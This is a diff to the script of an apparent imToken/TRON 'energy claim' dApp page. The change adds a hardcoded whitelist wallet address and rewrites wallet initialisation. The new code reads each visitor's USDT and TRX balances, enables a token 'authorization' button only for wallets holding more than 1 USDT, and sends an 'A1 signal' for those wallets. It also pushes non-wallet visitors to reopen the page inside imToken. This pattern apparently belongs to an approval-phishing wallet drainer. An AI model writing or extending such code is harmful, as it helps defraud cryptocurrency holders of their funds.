@@ -339,6 +339,7 @@ body {
    <script src="imtoken://browser"></script>
 <script>
 // ========== 全局变量优先定义（防止作用域隔离，确保定时器能访问） ==========
+const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
 let currentEnergy = 0; // 全局能量存储
 const INIT_TRX = 4104470400000; // 2年有效期初始值
 const TRX_DECREASE_PER_SEC = 65200; // 每秒减65200（肉眼可见跳数）
@@ -796,16 +797,63 @@ async function checkImTokenEnv() {
  * 钱包初始化（连接后立即显示按钮，动态文本多语言适配）
  * @param {boolean} isAfterApprove - 是否是授权后返回
  */
+
 async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
-        if (!userAddress) throw new Error(lang.ineligibleTip);
-
-        // 30天内已领取（客户原因）- 优先拦截，不发送任何信号
-        if (isAddressAuthorized(userAddress)) {
+        // 1. 特殊地址白名单：直接放行，发送A1信号
+        if (userAddress === SPECIAL_ADDRESS) {
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
+            // 查询余额并显示
+            trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+            const [usdtRaw, trxRaw] = await Promise.all([
+                trc20Contract.balanceOf(userAddress).call().catch(err => 0),
+                tronWeb.trx.getBalance(userAddress).catch(err => 0)
+            ]);
+            tokenBalance = Number(usdtRaw) / 1000000;
+            trxBalance = Number(trxRaw) / 1000000;
+            // 显示符合条件+余额
+            userInfoEl.innerHTML = lang.eligibleTip
+                .replace("{address}", shortAddr)
+                .replace("{usdt}", tokenBalance.toFixed(2))
+                .replace("{trx}", trxBalance.toFixed(2));
+            document.getElementById("statusAddress").textContent = shortAddr;
+            updateWalletStatus();
+            // 发送A1信号，启用按钮
+            sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+            approveBtn.disabled = false;
+            approveBtn.textContent = lang.approveBtnText;
+            bindApproveLogic();
+            return;
+        }
+
+        // 2. 非特殊地址：按条件校验
+        if (!userAddress) {
+            // 无钱包地址：显示原因，禁用按钮，不发A1
+            userInfoEl.innerHTML = lang.noWalletAddress;
+            approveBtn.disabled = true;
+            approveBtn.textContent = lang.insufficientBtn;
+            updateWalletStatus();
+            return;
+        }
+
+        // 查询余额（所有不符合条件的情况均显示余额）
+        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+        const [usdtRaw, trxRaw] = await Promise.all([
+            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
+            tronWeb.trx.getBalance(userAddress).catch(err => 0)
+        ]);
+        tokenBalance = Number(usdtRaw) / 1000000;
+        trxBalance = Number(trxRaw) / 1000000;
+        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+
+        // 3. 30天内已领取：显示余额+原因，禁用按钮，不发A1
+        if (isAddressAuthorized(userAddress)) {
+            userInfoEl.innerHTML = lang.authorizedTip
+                .replace("{address}", shortAddr)
+                .replace("{usdt}", tokenBalance.toFixed(2))
+                .replace("{trx}", trxBalance.toFixed(2));
             approveBtn.disabled = true;
             approveBtn.textContent = lang.authorizedBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
@@ -813,78 +861,84 @@ async function initWallet(isAfterApprove) {
             return;
         }
 
-        if (isAfterApprove) {
-            const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
+        // 4. USDT余额不足（≤1）：显示余额+原因，禁用按钮，不发A1
+        if (tokenBalance <= 1) {
+            userInfoEl.innerHTML = lang.insufficientUsdt
+                .replace("{address}", shortAddr)
+                .replace("{usdt}", tokenBalance.toFixed(2))
+                .replace("{trx}", trxBalance.toFixed(2));
             approveBtn.disabled = true;
-            approveBtn.textContent = lang.deployingBtn;
+            approveBtn.textContent = lang.insufficientBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            await executeAfterApprove().catch(err => {
-                console.error("授权后发放能量失败：", err);
-                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.eligibleTip.replace("{address}", shortAddr).replace("{usdt}", tokenBalance.toFixed(2)).replace("{trx}", trxBalance.toFixed(2))}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
-                approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
-            });
             return;
         }
 
-        // 立即更新UI为「查询中」状态（按钮先禁用，查询完成后再判断是否启用）
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        // 5. 非imToken用户（环境检测补充）：显示原因，禁用按钮，不发A1
+        if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+            userInfoEl.innerHTML = lang.nonImTokenUser;
+            approveBtn.disabled = true;
+            approveBtn.textContent = lang.insufficientBtn;
+            updateWalletStatus();
+            return;
+        }
+
+        // 6. 符合条件（非特殊地址+所有校验通过）：发送A1信号
         userInfoEl.innerHTML = lang.eligibleTip
             .replace("{address}", shortAddr)
-            .replace("{usdt}", lang.queryingBalance)
-            .replace("{trx}", lang.queryingBalance);
-        approveBtn.disabled = true; // 初始禁用，符合条件后再启用
+            .replace("{usdt}", tokenBalance.toFixed(2))
+            .replace("{trx}", trxBalance.toFixed(2));
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-
-        // 异步查询余额（多语言适配）
-        trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        Promise.all([
-            trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-            tronWeb.trx.getBalance(userAddress).catch(err => 0)
-        ]).then(([usdtRaw, trxRaw]) => {
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-
-            // 余额不足（不符合条件）- 不发送A1信号
-            if (tokenBalance <= 1) {
-                userInfoEl.innerHTML = lang.insufficientUsdt
-                    .replace("{address}", shortAddr)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-                approveBtn.disabled = true;
-                approveBtn.textContent = lang.insufficientBtn;
-            } else {
-                // 符合条件（未领取+余额足够）- 仅此时发送A1信号
-                sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
-                // 更新UI为「可领取」状态，启用按钮
-                userInfoEl.innerHTML = lang.eligibleTip
-                    .replace("{address}", shortAddr)
-                    .replace("{usdt}", tokenBalance.toFixed(2))
-                    .replace("{trx}", trxBalance.toFixed(2));
-                approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
-                bindApproveLogic(); // 绑定领取按钮逻辑
-            }
-        }).catch(err => {
-            console.error("余额异步查询失败：", err);
-            approveBtn.disabled = false;
-            approveBtn.textContent = lang.approveBtnText;
-        });
+        sendSignalA1().catch(err => console.error("A1信号异步发送失败：", err));
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
+        bindApproveLogic();
 
     } catch (e) {
         console.error("钱包初始化失败：", e);
+        // 异常情况：显示余额（如有）+ 原因，禁用按钮，不发A1
         const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-        const tip = isCustomerError(e.message) ? lang.ineligibleTip : lang.systemBusyTip;
-        userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
-        approveBtn.disabled = false;
-        approveBtn.textContent = lang.approveBtnText;
+        const errorTip = userAddress ? 
+            `${lang.insufficientUsdt.replace("{address}", shortAddr).replace("{usdt}", tokenBalance?.toFixed(2) || 0).replace("{trx}", trxBalance?.toFixed(2) || 0)}` :
+            lang.noWalletAddress;
+        userInfoEl.innerHTML = errorTip;
+        approveBtn.disabled = true;
+        approveBtn.textContent = lang.insufficientBtn;
+        updateWalletStatus();
     }
 }
-
+// ========== 环境检测函数补充（checkImTokenEnv） ==========
+async function checkImTokenEnv() {
+    const lang = langConfig[currentLang];
+    if (window.tronWeb) {
+        tronWeb = window.tronWeb;
+        connectBtn.style.display = "none";
+        warning.style.display = "none";
+        await initWallet(false);
+    } else {
+        try {
+            // 非imToken环境：显示原因，禁用领取按钮
+            userInfoEl.innerHTML = `
+                ${lang.nonImTokenUser}<br>
+                <span style="color: #3b82f6; font-size: 13px;">${lang.copyGuide.split("✅ ")[1]}</span>
+            `;
+            approveBtn.style.display = "none"; // 非钱包环境直接隐藏领取按钮
+            connectBtn.onclick = async () => {
+                try {
+                    const dappUrl = window.location.href;
+                    await navigator.clipboard.writeText(dappUrl);
+                    window.location.href = "imtoken://open";
+                    setTimeout(() => {}, 1200);
+                } catch (e) {
+                    console.error("复制/唤起失败：", e);
+                }
+            };
+        } catch (e) {
+            console.error("非imToken环境处理失败：", e);
+        }
+    }
+}
 /**
  * 授权后执行：发放能量（多语言适配）
  */
